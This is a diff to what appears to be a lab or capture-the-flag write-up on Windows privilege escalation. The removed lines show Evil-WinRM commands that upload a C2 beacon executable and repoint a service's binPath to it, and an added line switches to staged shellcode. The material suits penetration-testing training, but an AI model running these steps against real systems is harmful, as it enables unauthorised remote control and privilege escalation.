@@ -923,28 +923,7 @@ I have the modify permission on an exe.
 
 So ill setup my adaptix c2 server and connect to it in the client
 
-Ive generated a stageless executable using adaptix and im listneing on port 443 in the client
-
-```python
-*Evil-WinRM* PS C:\Users\l_conrad\Documents> upload http.x64.exe
-                                        
-Info: Uploading /home/kali/hsm/CTOS/http.x64.exe to C:\Users\l_conrad\Documents\http.x64.exe
-                                        
-Data: 120148 bytes of 120148 bytes copied
-                                        
-Info: Upload successful!
-
-*Evil-WinRM* PS C:\Users\l_conrad\Documents> mv http.x64.exe C:\programdata
-```
-
-Ill now upload the payload
-
-```python
-*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\programdata\http.x64.exe"
-[SC] ChangeServiceConfig SUCCESS
-```
-
-Ill then change the binpath to my payload
+Ive generated some shellcode on adaptix, ill be using a staged payload
 
 ```python
 
